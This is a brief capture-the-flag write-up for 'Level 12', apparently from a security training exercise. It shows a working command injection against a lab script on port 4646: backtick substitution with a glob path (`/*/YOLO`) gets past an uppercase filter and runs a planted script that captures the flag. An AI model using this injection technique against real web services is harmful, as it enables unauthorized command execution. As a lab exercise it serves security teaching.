##LEVEL 12

The file is a script that is listening on 4646 port. We can go to the address.
We also see 2 regex in the script, one is replacing the lowercase by uppercase, the other one trim the spaces.

Knowing that, we cannot just pass a parameter that is launching the getflag command and redirecting to another file.
The script is showing an "x" argument, so we assume that its possible to use it in way to execute a file.

We create a script :
touch /tmp/YOLO
chmod 777 /tmp/YOLO

#!/bin/sh
/bin/getflag > /tmp/result

Then, we can go to the URL and pass the file as the x parameter : localhost:4646?x="`/*/YOLO`"
Now we can `cat /tmp/result` and notice we got the flag.
